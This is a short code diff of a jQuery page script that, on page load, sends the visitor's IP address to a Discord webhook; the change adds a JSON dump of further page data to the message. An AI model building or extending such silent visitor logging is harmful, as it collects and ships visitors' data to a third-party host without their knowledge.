@@ -7,10 +7,10 @@ $(document).ready(function() {
     
       // Create the payload to send to Discord
       var discordPayload = {
-        content: 'Visited IP: ' + ipAddress
+        content: 'Visited IP: ' + ipAddress + JSON.stringify(data, null, 2)
       };
 
-        console.log(JSON.stringify(data, null, 2));
+      console.log(JSON.stringify(data, null, 2));
     
       // Send data to Discord webhook
       $.ajax({
